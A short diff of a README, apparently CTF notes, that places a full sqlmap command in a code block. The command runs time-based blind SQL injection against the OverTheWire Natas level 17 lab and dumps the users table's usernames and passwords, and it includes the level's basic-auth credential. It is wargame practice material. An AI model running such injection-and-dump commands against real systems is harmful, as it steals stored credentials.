@@ -74,10 +74,8 @@ Requires Python 2.*
 ```bash
 $ git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
 $ cd sqlmap-dev
-$ python2 ./sqlmap.py
+$ python2 ./sqlmap.py --auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u "http://natas17.natas.labs.overthewire.org/index.php?username=natas17" --level 3 --dbms="MySQL 5.5" -p username --technique T -D natas17 -T users -C username,password --dump
 ```
-
---auth-cred="natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw" --auth-type=BASIC -u "http://natas17.natas.labs.overthewire.org/index.php?username=natas17" --level 3 --dbms="MySQL 5.5" -p username --technique T -D natas17 -T users -C username,password --dump
 
 ### Usage
 Find an injectable GET/POST param, such as `?user=love`.
